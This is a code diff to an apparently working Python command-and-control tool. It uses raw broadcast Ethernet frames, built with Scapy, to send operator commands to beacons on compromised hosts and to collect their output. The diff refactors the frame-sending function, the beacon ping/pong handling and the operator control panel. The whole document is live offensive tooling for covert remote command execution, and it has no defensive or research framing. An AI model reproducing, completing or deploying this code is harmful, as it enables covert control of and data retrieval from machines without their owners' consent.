@@ -21,12 +21,12 @@ c2_id_r = hashlib.sha3_256()
 c2_id_r.update(c2_id.encode('utf-8'))
 c2_id_r = c2_id_r.hexdigest()
                  
-def send_frame(message, mac_address):
+def send_frame(message, mac_address, sender):
     # Next send the output back to the command server
     frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
     for frame in frames:
         time.sleep(frame_delay)
-        frame = attacker_id + frame.decode('utf-8') # Make sure to add the attacker id
+        frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
         eth_frame = Ether(dst=mac_address) / frame
         
         # Send the Ethernet frame
@@ -47,6 +47,7 @@ def process_frame(frame):
                 print("Payload Length:", len(eth_frame.payload))
                 string = str(eth_frame.payload.original)[index + len(session_id):]
                 string = string.strip("'")
+                string = string.strip(session_id)
                 pad = "\\x00"
                 nstring = string.replace(pad, '')
                 try:
@@ -59,12 +60,12 @@ def process_frame(frame):
                     noutput = attacker_id + output
                     
                 # Next send the output back to the command server
-                send_frame(noutput.encode('utf-8'), "FF:FF:FF:FF:FF:FF")
+                send_frame(noutput.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)
                 
             if c2_id.encode("utf-8") in eth_frame.payload.original: # Respond to c2 ping
                 # Send frame of c2_id hashed again
                 print("pong")
-                send_frame(c2_id_r.encode('utf-8'), "FF:FF:FF:FF:FF:FF")             
+                send_frame(c2_id_r.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)             
 
 
 # This method is the listening server for the attacker host.
@@ -78,8 +79,8 @@ def process_return_frame(frame):
                 index = str(eth_frame.payload.original).find(attacker_id)
                 if c2_id_r.encode("utf-8") in eth_frame.payload.original:
                     print("Beacon: " + "[" + eth_frame.src + "]")
-                    index = 1
-                    
+                    index = -1
+                
                 if index != -1:
                     #print("Source MAC:", eth_frame.src)
                     #print("Destination MAC:", eth_frame.dst)
@@ -88,14 +89,15 @@ def process_return_frame(frame):
                     string = string.replace("'", "")
                     pad = "\\x00" # Gets rid of padding
                     returnc = "\\r" # Gets rid of return carriage
-                    nstring = string.replace(attacker_id, '')
+                    #nstring = string.replace(attacker_id, '')
+                    string = string.strip(attacker_id)
                     
                     nstring = string.replace(returnc, '')
                     nstring = nstring.replace(pad, '')
                     
                     # Attempts to format the terminal items
                     terminal_format = nstring.split('\\n')
-                    
+                    #print(terminal_format)
                     for line in terminal_format:
                         print(line)
                     
@@ -115,7 +117,7 @@ def ControlPanel(userin):
             
             if userin == "1":
                 print("Pinging Beacons: \n")
-                send_frame(c2_id.encode('utf-8'), "FF:FF:FF:FF:FF:FF")
+                send_frame(c2_id.encode('utf-8'), "FF:FF:FF:FF:FF:FF", "")
                 time.sleep(3) # Wait some time for beacons to call home
                 
             elif userin == "2":
@@ -160,7 +162,7 @@ def connect():
         ControlPanel(userin)
         
         if userin != session_id and "enable options" not in userin:
-            send_frame(userin.encode('utf-8'), mac_address)
+            send_frame(userin.encode('utf-8'), mac_address, session_id)
             
         else:
             print("" + session_id + ">", end='')
